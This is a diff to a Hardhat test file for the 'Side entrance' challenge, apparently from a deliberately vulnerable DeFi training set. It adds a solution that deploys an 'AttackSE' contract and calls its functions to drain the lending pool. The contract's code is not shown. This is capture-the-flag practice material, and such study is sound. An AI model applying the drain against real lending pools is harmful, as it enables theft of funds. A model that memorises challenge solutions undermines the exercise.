@@ -1,10 +1,11 @@
-const { ethers } = require('hardhat');
+const { ethers } = require('hardhat'); 
 const { expect } = require('chai');
 const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');
 
 describe('[Challenge] Side entrance', function () {
     let deployer, player;
     let pool;
+    let attack;
 
     const ETHER_IN_POOL = 1000n * 10n ** 18n;
     const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 18n;
@@ -25,7 +26,10 @@ describe('[Challenge] Side entrance', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        const AttackFactory = await ethers.getContractFactory('AttackSE', deployer);
+        attack = await AttackFactory.deploy(player.address,pool.address);
+        await attack.kek();
+        await attack.withdraw();
     });
 
     after(async function () {
